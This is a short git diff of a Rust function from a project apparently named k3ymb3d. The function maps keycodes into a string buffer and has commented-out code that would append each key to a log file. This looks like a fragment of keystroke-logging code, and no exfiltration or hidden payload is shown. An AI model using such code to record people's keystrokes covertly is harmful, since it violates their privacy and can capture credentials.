@@ -6,21 +6,13 @@ use dotenv::dotenv;
 use std::env;
 
 
-pub fn match_case(key: &Keycode, buffer: &str) -> &'static str {
+pub fn match_case(key: &Keycode, buffer: &mut String) -> &'static str {
 
     //let mut file = OpenOptions::new()
     //.create(true)
     //.append(true)
     //.open("/home/oef/Documents/Github/k3ymb3d/log.txt")
     //.expect("Failed to open file");
-    
-
-
-    // check if len buffer is less than 50
-    // if it is, print it buffer
-    if buffer.len() > 50 {
-        println!("{}", buffer);
-    }
 
 
     // using match expression
@@ -43,6 +35,7 @@ pub fn match_case(key: &Keycode, buffer: &str) -> &'static str {
             buffer.push_str("?");
             "?"
         } 
+        
         _ => { 
             //write!(file, "{}",  key).expect("Failed to write to file");  
             buffer.push_str(&format!("{}", key));
